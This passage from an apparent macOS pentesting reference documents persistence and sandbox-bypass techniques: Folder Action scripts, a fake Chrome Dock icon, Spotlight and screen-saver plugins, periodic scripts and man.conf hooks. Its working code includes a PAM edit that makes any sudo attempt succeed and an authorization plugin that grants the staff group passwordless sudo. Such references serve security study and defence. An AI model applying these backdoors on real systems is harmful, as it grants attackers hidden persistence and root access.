Action Scripts\nRoot required\nTrigger\n: Access to the specified folder\n~/Library/Scripts/Folder Action Scripts\nTrigger\n: Access to the specified folder\nDescription & Exploitation\nA Folder Action script is executed when the folder to which it is attached has items added or removed, or when its window is opened, closed, moved, or resized:\nOpen the folder via the Finder UI\nAdd a file to the folder (can be done via drag/drop or even in a shell prompt from a terminal)\nRemove a file from the folder (can be done via drag/drop or even in a shell prompt from a terminal)\nNavigate out of the folder via the UI\nThere are a couple ways to implement this:\n1.\nUse the\nAutomator\nprogram to create a Folder Action workflow file (.workflow) and install it as a service.\n2.\nRight-click on a folder, select\nFolder Actions Setup...\n,\nRun Service\n, and manually attach a script.\n3.\nUse OSAScript to send Apple Event messages to the\nSystem Events.app\nto programmatically query and register a new\nFolder Action.\n‚Äã\nThis is the way to implement persistence using an OSAScript to send Apple Event messages to\nSystem Events.app\nThis is the script that will be executed:\nsource.js\nvar app\n=\nApplication.currentApplication\n()\n;\napp.includeStandardAdditions\n=\ntrue\n;\napp.doShellScript\n(\n\"touch /tmp/folderaction.txt\"\n)\n;\napp.doShellScript\n(\n\"touch ~/Desktop/folderaction.txt\"\n)\n;\napp.doShellScript\n(\n\"mkdir /tmp/asd123\"\n)\n;\napp.doShellScript\n(\n\"cp -R ~/Desktop /tmp/asd123\"\n)\n;\nCompile it with:\nosacompile -l JavaScript -o folder.scpt source.js\nThen execute the following script to enable Folder Actions and attach the previously compiled script with the folder\n/users/username/Desktop\n:\nvar\nse\n=\nApplication\n(\n\"System Events\"\n);\nse\n.\nfolderActionsEnabled\n=\ntrue\n;\nvar\nmyScript\n=\nse\n.\nScript\n({\nname\n:\n\"source.js\"\n,\nposixPath\n:\n\"/tmp/source.js\"\n});\nvar\nfa\n=\nse\n.\nFolderAction\n({\nname\n:\n\"Desktop\"\n,\npath\n:\n\"/Users/username/Desktop\"\n});\nse\n.\nfolderActions\n.\npush\n(\nfa\n);\nfa\n.\nscripts\n.\npush\n(\nmyScript\n);\nExecute script with:\nosascript -l JavaScript /Users/username/attach.scpt\n‚Äã\nThis is the way yo implement this persistence via GUI:\nThis is the script that will be executed:\nsource.js\nvar app\n=\nApplication.currentApplication\n()\n;\napp.includeStandardAdditions\n=\ntrue\n;\napp.doShellScript\n(\n\"touch /tmp/folderaction.txt\"\n)\n;\napp.doShellScript\n(\n\"touch ~/Desktop/folderaction.txt\"\n)\n;\napp.doShellScript\n(\n\"mkdir /tmp/asd123\"\n)\n;\napp.doShellScript\n(\n\"cp -R ~/Desktop /tmp/asd123\"\n)\n;\nCompile it with:\nosacompile -l JavaScript -o folder.scpt source.js\nMove it to:\nmkdir\n-p\n\"\n$HOME\n/Library/Scripts/Folder Action Scripts\"\nmv\n/tmp/folder.scpt\n\"\n$HOME\n/Library/Scripts/Folder Action Scripts\"\nThen, open the\nFolder Actions Setup\napp, select the\nfolder you would like to watch\nand select in your case\nfolder.scpt\n(in my case I called it output2.scp):\nNow, if you open that folder with\nFinder\n, your script will be executed.\nThis configuration was stored in the\nplist\nlocated in\n~/Library/Preferences/com.apple.FolderActionsDispatcher.plist\nin base64 format.\nNow, lets try to prepare this persistence without GUI access:\n1.\nCopy\n~/Library/Preferences/com.apple.FolderActionsDispatcher.plist\nto\n/tmp\nto backup it:\ncp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp\n2.\nRemove\nthe Folder Actions you just set:\nNow that we have an empty environment\n3.\nCopy the backup file:\ncp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/\n4.\nOpen the Folder Actions Setup.app to consume this config:\nopen \"/System/Library/CoreServices/Applications/Folder Actions Setup.app/\"\nAnd this didn't work for me, but those are the instructions from the writeup:(\nSpotlight Importers\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0011/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you will end in a new one\nLocation\n/Library/Spotlight\n~/Library/Spotlight\nDescription\nYou will end up in a\nheavy sandbox\n, so you probably don't want to use this technique.\nDock shortcuts\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0027/\n‚Äã\nUseful to bypass sandbox:\n‚úÖ\n‚Äã\nBut you need to have installed a malicious application inside the system\nLocation\n~/Library/Preferences/com.apple.dock.plist\nTrigger\n: When the user clicks on the app inside the dock\nDescription & Exploitation\nAll the applications that appear in the Dock are specified inside the plist:\n~/Library/Preferences/com.apple.dock.plist\nIt's possible to\nadd an application\njust with:\n# Add /System/Applications/Books.app\ndefaults\nwrite\ncom.apple.dock persistent-apps -array-add\n'<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'\n‚Äã\n# Restart Dock\nkillall\nDock\nUsing some\nsocial engineering\nyou could\nimpersonate for example Google Chrome\ninside the dock and actually execute your own script:\n#!/bin/sh\n‚Äã\n# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)\n‚Äã\nrm\n-rf\n/tmp/Google\n\\\nChrome.app/\n2\n>\n/dev/null\n‚Äã\n# Create App structure\nmkdir\n-p\n/tmp/Google\n\\\nChrome.app/Contents/MacOS\nmkdir\n-p\n/tmp/Google\n\\\nChrome.app/Contents/Resources\n‚Äã\n# Payload to execute\necho\n'#!/bin/sh\nopen /Applications/Google\\ Chrome.app/ &\ntouch /tmp/ImGoogleChrome'\n>\n/tmp/Google\n\\\nChrome.app/Contents/MacOS/Google\n\\\nChrome\n‚Äã\nchmod\n+x /tmp/Google\n\\\nChrome.app/Contents/MacOS/Google\n\\\nChrome\n‚Äã\n# Info.plist\ncat\n<<\nEOF\n>\n/tmp/Google\n\\\nChrome.app/Contents/Info.plist\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>CFBundleExecutable</key>\n<string>Google Chrome</string>\n<key>CFBundleIdentifier</key>\n<string>com.google.Chrome</string>\n<key>CFBundleName</key>\n<string>Google Chrome</string>\n<key>CFBundleVersion</key>\n<string>1.0</string>\n<key>CFBundleShortVersionString</key>\n<string>1.0</string>\n<key>CFBundleInfoDictionaryVersion</key>\n<string>6.0</string>\n<key>CFBundlePackageType</key>\n<string>APPL</string>\n<key>CFBundleIconFile</key>\n<string>app</string>\n</dict>\n</plist>\nEOF\n‚Äã\n# Copy icon from Google Chrome\ncp\n/Applications/Google\n\\\nChrome.app/Contents/Resources/app.icns /tmp/Google\n\\\nChrome.app/Contents/Resources/app.icns\n‚Äã\n# Add to Dock\ndefaults\nwrite\ncom.apple.dock persistent-apps -array-add\n'<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'\nkillall\nDock\nColor Pickers\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0017\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nA very specific action needs to happen\nYou will end in another sandbox\nLocation\n/Library/ColorPickers\nRoot required\nTrigger: Use the color picker\n~/Library/ColorPickers\nTrigger: Use the color picker\nDescription & Exploit\nCompile a color picker\nbundle with your code (you could use\nthis one for example\n) and add a constructor (like in the\nScreen Saver section\n) and copy the bundle to\n~/Library/ColorPickers\n.\nThen, when the color picker is triggered your should should be aswell.\nNote that the binary loading your library has a\nvery restrictive sandbox\n:\n/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64\n[\nKey\n]\ncom.apple.security.temporary-exception.sbpl\n[\nValue\n]\n[\nArray\n]\n[\nString\n]\n(\ndeny file-write*\n(\nhome-subpath\n\"/Library/Colors\"\n))\n[\nString\n]\n(\nallow file-read* process-exec file-map-executable\n(\nhome-subpath\n\"/Library/ColorPickers\"\n))\n[\nString\n]\n(\nallow file-read*\n(\nextension\n\"com.apple.app-sandbox.read\"\n))\nFinder Sync Plugins\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0026/\nWriteup\n:\nhttps://objective-see.org/blog/blog_0x11.html\n‚Äã\nUseful to bypass sandbox:\nNo, because you need to execute your own app\nLocation\nA specific app\nDescription & Exploit\nAn application example with a Finder Sync Extension\ncan be found here\n.\nApplications can have\nFinder Sync Extensions\n. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it\nmust be signed\nwith some valid Apple developer certificate, it must be\nsandboxed\n(although relaxed exceptions could be added) and it must be registered with something like:\npluginkit\n-a\n/Applications/FindIt.app/Contents/PlugIns/FindItSync.appex\npluginkit\n-e\nuse\n-i\ncom.example.InSync.InSync\nScreen Saver\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0016/\nWriteup:\nhttps://posts.specterops.io/saving-your-access-d562bf5bf90b\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you will end in a common application sandbox\nLocation\n/System/Library/Screen Savers\nRoot required\nTrigger\n: Select the screen saver\n/Library/Screen Savers\nRoot required\nTrigger\n: Select the screen saver\n~/Library/Screen Savers\nTrigger\n: Select the screen saver\nDescription & Exploit\nCreate a new project in Xcode and select the template to generate a new\nScreen Saver\n. Then, are your code to it, for example the following code to generate logs.\nBuild\nit, and copy the\n.saver\nbundle to\n~/Library/Screen Savers\n. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:\nsudo\nlog stream\n--style\nsyslog\n--predicate\n'eventMessage CONTAINS[c] \"hello_screensaver\"'\n‚Äã\nTimestamp\n(\nprocess\n)[\nPID\n]\n2023\n-09-27\n22\n:55:39.622369+0200  localhost legacyScreenSaver\n[\n41737\n]\n:\n(\nScreenSaverExample\n)\nhello_screensaver void custom\n(\nint, const char **\n)\n2023\n-09-27\n22\n:55:39.622623+0200  localhost legacyScreenSaver\n[\n41737\n]\n:\n(\nScreenSaverExample\n)\nhello_screensaver -\n[\nScreenSaverExampleView initWithFrame:isPreview:\n]\n2023\n-09-27\n22\n:55:39.622704+0200  localhost legacyScreenSaver\n[\n41737\n]\n:\n(\nScreenSaverExample\n)\nhello_screensaver -\n[\nScreenSaverExampleView hasConfigureSheet\n]\nNote that because inside the entitlements of the binary that loads this code (\n/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver\n) you can find\ncom.apple.security.app-sandbox\nyou will be\ninside the common application sandbox\n.\nSaver code:\n//\n//  ScreenSaverExampleView.m\n//  ScreenSaverExample\n//\n//  Created by Carlos Polop on 27/9/23.\n//\n‚Äã\n#\nimport\n\"ScreenSaverExampleView.h\"\n‚Äã\n@implementation\nScreenSaverExampleView\n‚Äã\n-\n(\ninstancetype\n)\ninitWithFrame\n:(\nNSRect\n)\nframe isPreview\n:(\nBOOL\n)\nisPreview\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\nself\n=\n[\nsuper\ninitWithFrame\n:\nframe isPreview\n:\nisPreview\n];\nif\n(\nself\n)\n{\n[\nself\nsetAnimationTimeInterval\n:\n1\n/\n30.0\n];\n}\nreturn\nself\n;\n}\n‚Äã\n-\n(\nvoid\n)\nstartAnimation\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\n[\nsuper\nstartAnimation\n];\n}\n‚Äã\n-\n(\nvoid\n)\nstopAnimation\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\n[\nsuper\nstopAnimation\n];\n}\n‚Äã\n-\n(\nvoid\n)\ndrawRect\n:(\nNSRect\n)\nrect\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\n[\nsuper\ndrawRect\n:\nrect\n];\n}\n‚Äã\n-\n(\nvoid\n)\nanimateOneFrame\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\nreturn\n;\n}\n‚Äã\n-\n(\nBOOL\n)\nhasConfigureSheet\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\nreturn\nNO\n;\n}\n‚Äã\n-\n(\nNSWindow\n*\n)\nconfigureSheet\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\nreturn\nnil\n;\n}\n‚Äã\n__attribute__\n((\nconstructor\n))\nvoid\ncustom\n(\nint\nargc\n,\nconst\nchar\n**\nargv\n)\n{\nNSLog\n(\n@\"hello_screensaver %s\"\n,\n__PRETTY_FUNCTION__\n);\n}\n‚Äã\n@end\nSpotlight Plugins\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you will end in an application sandbox\nLocation\n~/Library/Spotlight/\nTrigger\n: A new file with a extension managed by the spotlight plugin is created.\n/Library/Spotlight/\nTrigger\n: A new file with a extension managed by the spotlight plugin is created.\nRoot required\n/System/Library/Spotlight/\nTrigger\n: A new file with a extension managed by the spotlight plugin is created.\nRoot required\nSome.app/Contents/Library/Spotlight/\nTrigger\n: A new file with a extension managed by the spotlight plugin is created.\nNew app required\nDescription & Exploitation\nSpotlight is macOS's built-in search feature, designed to provide users with\nquick and comprehensive access to data on their computers\n.\nTo facilitate this rapid search capability, Spotlight maintains a\nproprietary database\nand creates an index by\nparsing most files\n, enabling swift searches through both file names and their content.\nThe underlying mechanism of Spotlight involves a central process named 'mds', which stands for\n'metadata server'.\nThis process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (\nps -ef | grep mdworker\n). These tasks are made possible through Spotlight importer plugins, or\n\".mdimporter bundles\n\", which enable Spotlight to understand and index content across a diverse range of file formats.\nThe plugins or\n.mdimporter\nbundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which\nfile type and extensions they can manage\n, this way, Spotlight will use them when a new file with the indicated extension is created.\nIt's possible to\nfind all the\nmdimporters\nloaded running:\nmdimport\n-L\nPaths: id\n(\n501\n)\n(\n\"/System/Library/Spotlight/iWork.mdimporter\"\n,\n\"/System/Library/Spotlight/iPhoto.mdimporter\"\n,\n\"/System/Library/Spotlight/PDF.mdimporter\"\n,\n[..\n.\n]\nAnd for example\n/Library/Spotlight/iBooksAuthor.mdimporter\nis used to parse these type of files (extensions\n.iba\nand\n.book\namong others):\nplutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist\n‚Äã\n[\n...\n]\n\"CFBundleDocumentTypes\"\n=>\n[\n0\n=>\n{\n\"CFBundleTypeName\"\n=>\n\"iBooks Author Book\"\n\"CFBundleTypeRole\"\n=>\n\"MDImporter\"\n\"LSItemContentTypes\"\n=>\n[\n0\n=>\n\"com.apple.ibooksauthor.book\"\n1\n=>\n\"com.apple.ibooksauthor.pkgbook\"\n2\n=>\n\"com.apple.ibooksauthor.template\"\n3\n=>\n\"com.apple.ibooksauthor.pkgtemplate\"\n]\n\"LSTypeIsPackage\"\n=>\n0\n}\n]\n[\n...\n]\n=>\n{\n\"UTTypeConformsTo\"\n=>\n[\n0\n=>\n\"public.data\"\n1\n=>\n\"public.composite-content\"\n]\n\"UTTypeDescription\"\n=>\n\"iBooks Author Book\"\n\"UTTypeIdentifier\"\n=>\n\"com.apple.ibooksauthor.book\"\n\"UTTypeReferenceURL\"\n=>\n\"http://www.apple.com/ibooksauthor\"\n\"UTTypeTagSpecification\"\n=>\n{\n\"public.filename-extension\"\n=>\n[\n0\n=>\n\"iba\"\n1\n=>\n\"book\"\n]\n}\n}\n[\n...\n]\nIf you check the Plist of other\nmdimporter\nyou might not find the entry\nUTTypeConformsTo\n. Thats because that is a built-in\nUniform Type Identifiers\n(\nUTI\n) and it doesn't need to specify extensions.\nMoreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own\nmdimporters\n.\nTo create your own importer you could start with this project:\nhttps://github.com/megrimm/pd-spotlight-importer\nand then change the name, the\nCFBundleDocumentTypes\nand add\nUTImportedTypeDeclarations\nso it supports the extension you would like to support and refelc them in\nschema.xml\n.\nThen\nchange\nthe code of the function\nGetMetadataForFile\nto execute your payload when a file with the processed extension is created.\nFinally\nbuild and copy your new\n.mdimporter\nto one of thre previous locations and you can chech whenever it's loaded\nmonitoring the logs\nor checking\nmdimport -L.\nPreference Pane\nIt doesn't look like this is working anymore.\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0009/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nIt needs a specific user action\nLocation\n/System/Library/PreferencePanes\n/Library/PreferencePanes\n~/Library/PreferencePanes\nDescription\nIt doesn't look like this is working anymore.\nRoot Sandbox Bypass\nHere you can find start locations useful for\nsandbox bypass\nthat allows you to simply execute something by\nwriting it into a file\nbeing\nroot\nand/or requiring other\nweird conditions.\nPeriodic\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0019/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root\nLocation\n/etc/periodic/daily\n,\n/etc/periodic/weekly\n,\n/etc/periodic/monthly\n,\n/usr/local/etc/periodic\nRoot required\nTrigger\n: When the time comes\n/etc/daily.local\n,\n/etc/weekly.local\nor\n/etc/monthly.local\nRoot required\nTrigger\n: When the time comes\nDescription & Exploitation\nThe periodic scripts (\n/etc/periodic\n) are executed because of the\nlaunch daemons\nconfigured in\n/System/Library/LaunchDaemons/com.apple.periodic*\n. Note that scripts stored in\n/etc/periodic/\nare\nexecuted\nas the\nowner of the file,\nso this won't work for a potential privilege escalation.\n# Launch daemons that will execute the periodic scripts\nls\n-l\n/System/Library/LaunchDaemons/com.apple.periodic*\n-rw-r--r--\n1\nroot  wheel\n887\nMay\n13\n00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist\n-rw-r--r--\n1\nroot  wheel\n895\nMay\n13\n00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist\n-rw-r--r--\n1\nroot  wheel\n891\nMay\n13\n00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist\n‚Äã\n# The scripts located in their locations\nls\n-lR\n/etc/periodic\ntotal\n0\ndrwxr-xr-x\n11\nroot  wheel\n352\nMay\n13\n00:29 daily\ndrwxr-xr-x\n5\nroot  wheel\n160\nMay\n13\n00:29 monthly\ndrwxr-xr-x\n3\nroot  wheel\n96\nMay\n13\n00:29 weekly\n‚Äã\n/etc/periodic/daily:\ntotal\n72\n-rwxr-xr-x\n1\nroot  wheel\n1642\nMay\n13\n00:29\n110\n.clean-tmps\n-rwxr-xr-x\n1\nroot  wheel\n695\nMay\n13\n00:29\n130\n.clean-msgs\n[..\n.\n]\n‚Äã\n/etc/periodic/monthly:\ntotal\n24\n-rwxr-xr-x\n1\nroot  wheel\n888\nMay\n13\n00:29\n199\n.rotate-fax\n-rwxr-xr-x\n1\nroot  wheel\n1010\nMay\n13\n00:29\n200\n.accounting\n-rwxr-xr-x\n1\nroot  wheel\n606\nMay\n13\n00:29\n999\n.local\n‚Äã\n/etc/periodic/weekly:\ntotal\n8\n-rwxr-xr-x\n1\nroot  wheel\n620\nMay\n13\n00:29\n999\n.local\nThere are other periodic scripts that will be executed indicated in\n/etc/defaults/periodic.conf\n:\ngrep\n\"Local scripts\"\n/etc/defaults/periodic.conf\ndaily_local\n=\n\"/etc/daily.local\"\n# Local scripts\nweekly_local\n=\n\"/etc/weekly.local\"\n# Local scripts\nmonthly_local\n=\n\"/etc/monthly.local\"\n# Local scripts\nIf you manage to write any of the files\n/etc/daily.local\n,\n/etc/weekly.local\nor\n/etc/monthly.local\nit will be\nexecuted sooner or later\n.\nNote that the periodic script will be\nexecuted as the owner of the script\n. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).\nPAM\nWriteup:\nLinux Hacktricks PAM\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0005/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root\nLocation\nRoot always required\nDescription & Exploitation\nAs PAM is more focused in\npersistence\nand malware that on easy execution inside macOS, this blog won't give a detailed explanation,\nread the writeups to understand this technique better\n.\nCheck PAM modules with:\nls\n-l\n/etc/pam.d\nA persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:\nauth       sufficient     pam_permit.so\nSo it will\nlooks like\nsomething like this:\n# sudo: auth account password session\nauth       sufficient     pam_permit.so\nauth       include        sudo_local\nauth       sufficient     pam_smartcard.so\nauth       required       pam_opendirectory.so\naccount    required       pam_permit.so\npassword   required       pam_deny.so\nsession    required       pam_permit.so\nAnd therefore any attempt to use\nsudo\nwill work\n.\nNote that this directory is protected by TCC so it's higly probably that the user will get a prompt asking for access.\nAuthorization Plugins\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0028/\nWriteup:\nhttps://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root and make extra configs\nLocation\n/Library/Security/SecurityAgentPlugins/\nRoot required\nIt's also needed to configure the authorization database to use the plugin\nDescription & Exploitation\nYou can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).\n// Compile the code and create a real bundle\n// gcc -bundle -framework Foundation main.m -o CustomAuth\n// mkdir -p CustomAuth.bundle/Contents/MacOS\n// mv CustomAuth CustomAuth.bundle/Contents/MacOS/\n‚Äã\n#\nimport\n<\nFoundation\n/\nFoundation\n.\nh\n>\n‚Äã\n__attribute__\n((\nconstructor\n))\nstatic\nvoid\nrun\n()\n{\nNSLog\n(\n@\"%@\"\n,\n@\"[+] Custom Authorization Plugin was loaded\"\n);\nsystem\n(\n\"echo \\\"%staff ALL=(ALL) NOPASSWD:ALL\\\" >> /etc/sudoers\"\n);\n}\nMove\nthe bundle to the location to be loaded:\ncp\n-r\nCustomAuth.bundle /Library/Security/SecurityAgentPlugins/\nFinally add the\nrule\nto load this Plugin:\ncat\n>\n/tmp/rule.plist\n<<\nEOF\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n<key>class</key>\n<string>evaluate-mechanisms</string>\n<key>mechanisms</key>\n<array>\n<string>CustomAuth:login,privileged</string>\n</array>\n</dict>\n</plist>\nEOF\n‚Äã\nsecurity authorizationdb\nwrite\ncom.asdf.asdf\n<\n/tmp/rule.plist\nThe\nevaluate-mechanisms\nwill tell the authorization framework that it will need to\ncall an external mechanism for authorization\n. Moreover,\nprivileged\nwill make it be executed by root.\nTrigger it with:\nsecurity authorize com.asdf.asdf\nAnd then the\nstaff group should have sudo\naccess (read\n/etc/sudoers\nto confirm).\nMan.conf\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0030/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root and the user must use man\nLocation\n/private/etc/man.conf\nRoot required\n/private/etc/man.conf\n: Whenever man is used\nDescription & Exploit\nThe config file\n/private/etc/man.conf\nindicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.\nFor example set in\n/private/etc/man.conf\n:\nMANPAGER /tmp/view\nAnd then create\n/tmp/view\nas:\n#!/bin/zsh\n‚Äã\ntouch\n/tmp/manconf\n‚Äã\n/usr/bin/less\n-s\nApache2\nWriteup\n:\nhttps://theevilbit.github.io/beyond/beyond_0023/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root and apache needs to be running\nLocation\n/etc/apache2/httpd.conf\nRoot required\nTrigger: When Apache2 is started\nDescription & Exploit\nYou can indicate in /etc/apache2/httpd.conf to load a module adding a line such as:\nLoadModule my_custom_module /Users/Shared/example.dylib\n\"My Signature Authority\"\nThis way your compiled moduled will be loaded by Apache. The only thing is that either you need to\nsign it with a valid Apple certificate\n, or you need to\nadd a new trusted certificate\nin the system and\nsign it\nwith it.\nThen, if needed , to make sure the server will be started you could execute:\nsudo\nlaunchctl load\n-w\n/System/Library/LaunchDaemons/org.apache.httpd.plist\nCode example for the Dylb:\n#\ninclude\n<stdio.h>\n#\ninclude\n<syslog.h>\n‚Äã\n__attribute__\n((\nconstructor\n))\nstatic\nvoid\nmyconstructor\n(\nint\nargc\n,\nconst\nchar\n**\nargv\n)\n{\nprintf\n(\n\"[+] dylib constructor called from %s\\n\"\n,\nargv\n[\n0\n]);\nsyslog\n(\nLOG_ERR\n,\n\"[+] dylib constructor called from %s\\n\"\n,\nargv\n[\n0\n]);\n}\nBSM audit framework\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0031/\n‚Äã\nUseful to bypass sandbox:\nüü†\n‚Äã\nBut you need to be root, auditd be running and cause a warning\nLocation\n/etc/security/audit_warn\nRoot required\nTrigger\n: When auditd detects a warning\nDescription & Exploit\nWhenever auditd detects a warning the script\n/etc/security/audit_warn\nis\nexecuted\n. So you could add your payload on it.\necho\n\"touch /tmp/auditd_warn\"\n>>\n/etc/security/audit_warn\nYou could force a warning with\nsudo audit -n\n.\nStartup Items\nThis is deprecated, so nothing should be found in the following directories.\nA\nStartupItem\nis a\ndirectory\nthat gets\nplaced\nin one of these two folders.\n/Library/StartupItems/\nor\n/System/Library/StartupItems/\nAfter placing a new directory in one of these two locations,\ntwo more items\nneed to be placed inside that directory. These two items are a\nrc script\nand a plist\nthat holds a few settings. This plist must be called ‚Äú\nStartupParameters.plist\n‚Äù.\nStartupParameters.plist\nsuperservicename\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!\nDOCTYPE\nplist\nPUBLIC\n\"-//Apple Computer//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\n>\n<\nplist\nversion\n=\n\"\n1.0\n\"\n>\n<\ndict\n>\n<\nkey\n>\nDescription\n</\nkey\n>\n<\nstring\n>\nThis is a description of this service\n</\nstring\n>\n<\nkey\n>\nOrderPreference\n</\nkey\n>\n<\nstring\n>\nNone\n</\nstring\n>\n<!--Other req services to execute before this -->\n<\nkey\n>\nProvides\n</\nkey\n>\n<\narray\n>\n<\nstring\n>\nsuperservicename\n</\nstring\n>\n<!--Name of the services provided by this file -->\n</\narray\n>\n</\ndict\n>\n</\nplist\n>\n#!/bin/sh\n.\n/etc/rc.common\n‚Äã\nStartService\n(){\ntouch\n/tmp/superservicestarted\n}\n‚Äã\nStopService\n(){\nrm\n/tmp/superservicestarted\n}\n‚Äã\nRestartService\n(){\necho\n\"Restarting\"\n}\n‚Äã\nRunService\n\"\n$1\n\"\nemond\nI cannot find this component in my macOS so for more info check the writeup\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0023/\n‚Äã\nApple introduced a logging mechanism called\nemond\n. It appears it was never fully developed, and development may have been\nabandoned\nby Apple for other mechanisms, but it remains\navailable\n.\nThis little-known service may\nnot be much use to a Mac admin\n, but to a threat actor one very good reason would be to use it as a\npersistence mechanism that most macOS admins probably wouldn't know\nto look for. Detecting malicious use of emond shouldn't be difficult, as the System LaunchDaemon for the service looks for scripts to run in only one place:\nls\n-l\n/private/var/db/emondClients\nXQuartz\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0018/\n‚Äã\nLocation\n/opt/X11/etc/X11/xinit/privileged_startx.d\nRoot required\nTrigger\n: With XQuartz\nDescription & Exploit\nXQuartz is\nno longer installed in macOS\n, so if you want more info check the writeup.\nkext\nIt's so complicated to install kext even as root taht I won't consider this to escape from sandboxes or even for persistence (unless you have an exploit)\nLocation\nIn order to install a KEXT as a startup item, it needs to be\ninstalled in one of the following locations\n:\n/System/Library/Extensions\nKEXT files built into the OS X operating system.\n/Library/Extensions\nKEXT files installed by 3rd party software\nYou can list currently loaded kext files with:\nkextstat\n#List loaded kext\nkextload /path/to/kext.kext\n#Load a new one based on path\nkextload\n-b\ncom.apple.driver.ExampleBundle\n#Load a new one based on path\nkextunload /path/to/kext.kext\nkextunload\n-b\ncom.apple.driver.ExampleBundle\nFor more information about\nkernel extensions check this section\n.\namstoold\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0029/\n‚Äã\nLocation\n/usr/local/bin/amstoold\nRoot required\nDescription & Exploitation\nApparently the\nplist\nfrom\n/System/Library/LaunchAgents/com.apple.amstoold.plist\nwas using this binary while exposing a XPC service... the thing is that the binary didn't exist, so you could place something there and when the XPC service gets called your binary will be called.\nI can no longer find this in my macOS.\nxsanctl\nWriteup:\nhttps://theevilbit.github.io/beyond/beyond_0015/\n‚Äã\nLocation\n/Library/Preferences/Xsan/.xsanrc\nRoot required\nTrigger\n: When the service is run (rarely)\nDescription & exploit\nApparently it's not very common to run this script and I couldn't even find it in my macOS, so if you want more info check the writeup.\n/etc/rc.common\nThis isn't working in modern MacOS versions\nIt's also possible to place here\ncommands that will be executed at startup.\nExample os regular rc.common script:\n#\n# Common setup for startup scripts.\n#\n# Copyright 1998-2002 Apple Computer, Inc.\n#\n‚Äã\n######################\n# Configure the shell #\n######################\n‚Äã\n#\n# Be strict\n#\n#set -e\nset\n-u\n‚Äã\n#\n# Set command search path\n#\nPATH\n=\n/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices\n;\nexport\nPATH\n‚Äã\n#\n# Set the terminal mode\n#\n#if [ -x /usr/bin/tset ] && [ -f 